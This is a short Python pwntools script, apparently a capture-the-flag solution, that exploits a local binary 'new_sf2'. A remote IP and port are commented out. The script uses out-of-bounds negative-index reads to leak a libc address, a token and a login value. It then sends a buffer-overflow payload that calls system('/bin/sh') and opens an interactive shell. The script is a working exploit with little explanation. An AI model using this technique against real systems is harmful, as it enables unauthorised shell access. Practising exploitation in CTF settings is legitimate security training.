from pwn import *
#nc 132.226.171.228 14001
time = 0.05
p = process("./new_sf2")
# p = remote("132.226.171.228", 14001);
p.sendline("1")
sleep(time)
p.sendline('-96')
sleep(time)
p.recvuntil("Value : ")
leak = u32(p.recv(4))

print(hex(leak))

input()

sys_leak = leak - 0xe6e0
bin_sh_leak = leak + 0x1100fb
# libc_base = leak - 0x49680 
# sys_leak = libc_base + 0x3adb0
# bin_sh_leak = libc_base + 0x15bb2b

pay = b''
pay += b'A' * 24
pay += b'A' * 4
pay += p32(sys_leak)
pay += b'A' * 4
pay += p32(bin_sh_leak)

p.sendline('1')
sleep(time)
p.sendline('-4')
sleep(time)
p.recvuntil("Value : ")

token_idx = u32(p.recv(4))
#print(token_idx)

p.sendline('1')
sleep(time)
p.sendline(str(token_idx))
sleep(time)
p.recvuntil("Value : ")
#input("stop0")
login = u32(p.recv(4))
sleep(time)

#input("stop1")
#print("login = {}".format(login))

p.sendline('2')
sleep(time)
p.sendline(p32(login))
sleep(time)

#input("stop2")

p.sendline('3')
sleep(time)
p.sendline(pay)

p.interactive()
